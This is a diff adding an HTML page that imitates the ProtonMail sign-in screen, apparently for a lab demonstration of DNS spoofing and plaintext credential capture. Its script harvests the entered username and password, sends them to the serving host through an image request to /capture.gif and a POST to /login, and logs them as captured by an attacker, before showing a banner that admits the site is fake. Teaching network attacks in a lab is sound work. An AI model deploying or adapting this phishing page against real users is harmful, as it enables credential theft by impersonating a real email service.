@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProtonMail - Secure Email Based in Switzerland</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-wrapper {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .header {
+            background: #8B5CF6;
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .logo {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        .tagline {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+
+        .login-container {
+            padding: 40px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 25px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #8B5CF6;
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #8B5CF6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-login:hover {
+            background: #7C3AED;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
+        }
+
+        .btn-login:active {
+            transform: translateY(0);
+        }
+
+        .warning {
+            display: none;
+            background: #FEE2E2;
+            border: 2px solid #FCA5A5;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            color: #991B1B;
+            text-align: center;
+            font-weight: 500;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .warning-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 13px;
+            border-top: 1px solid #eee;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .remember-me input {
+            margin-right: 8px;
+        }
+
+        .remember-me label {
+            margin: 0;
+            font-weight: normal;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .links a {
+            color: #8B5CF6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            padding: 10px;
+            background: #F3F4F6;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .security-badge::before {
+            content: "🔒";
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="header">
+            <div class="logo">🔐</div>
+            <div class="logo-text">ProtonMail</div>
+            <div class="tagline">Secure Email Based in Switzerland</div>
+        </div>
+
+        <div class="login-container">
+            <h2>Sign in to your account</h2>
+
+            <div id="warning" class="warning">
+                <div class="warning-icon">⚠️</div>
+                <strong>SECURITY ALERT!</strong><br>
+                You have been compromised! This is a fake site.<br>
+                <small>Educational demonstration of DNS spoofing attack.</small>
+            </div>
+
+            <form id="loginForm" onsubmit="return handleLogin(event)">
+                <div class="form-group">
+                    <label for="username">Username or ProtonMail address</label>
+                    <input type="text" id="username" name="username" 
+                           placeholder="Enter your username or email" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" 
+                           placeholder="Enter your password" required>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Keep me signed in</label>
+                </div>
+
+                <button type="submit" class="btn-login">Sign in</button>
+            </form>
+
+            <div class="links">
+                <a href="#">Forgot password?</a> • 
+                <a href="#">Need help?</a>
+            </div>
+
+            <div class="security-badge">
+                End-to-end encrypted and zero access encryption
+            </div>
+        </div>
+
+        <div class="footer">
+            <div>Don't have an account? <a href="#">Create account</a></div>
+            <div style="margin-top: 10px; font-size: 12px; color: #999;">
+                © 2026 Proton Technologies AG. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            
+            // Log to console (visible in browser dev tools)
+            console.log('╔═══════════════════════════════════════╗');
+            console.log('║   CREDENTIALS CAPTURED BY ATTACKER    ║');
+            console.log('╠═══════════════════════════════════════╣');
+            console.log('║ Username:', username.padEnd(27), '║');
+            console.log('║ Password:', password.padEnd(27), '║');
+            console.log('║ Remember:', remember.toString().padEnd(27), '║');
+            console.log('╚═══════════════════════════════════════╝');
+            
+            // Send credentials via GET request (will appear in network traffic)
+            const img = new Image();
+            img.src = '/capture.gif?user=' + encodeURIComponent(username) + 
+                      '&pass=' + encodeURIComponent(password) + 
+                      '&remember=' + remember +
+                      '&timestamp=' + Date.now();
+            
+            // Also send as POST (more realistic)
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    remember: remember,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(err => console.log('Sent to attacker server'));
+            
+            // Show warning after brief delay
+            setTimeout(() => {
+                document.getElementById('warning').style.display = 'block';
+                document.getElementById('loginForm').style.opacity = '0.5';
+                
+                // Log packet capture reminder
+                console.log('\n💡 These credentials were transmitted in PLAINTEXT');
+                console.log('💡 Check VM3 tcpdump capture to see them in network traffic');
+                console.log('💡 This is why HTTPS/TLS is critical!');
+            }, 500);
+            
+            return false;
+        }
+
+        // Add some "legitimacy" - fake loading animation
+        window.addEventListener('load', () => {
+            console.log('ProtonMail Web Client v4.0.8 loaded');
+            console.log('WARNING: This is a FAKE site for educational purposes!');
+        });
+    </script>
+</body>
+</html>
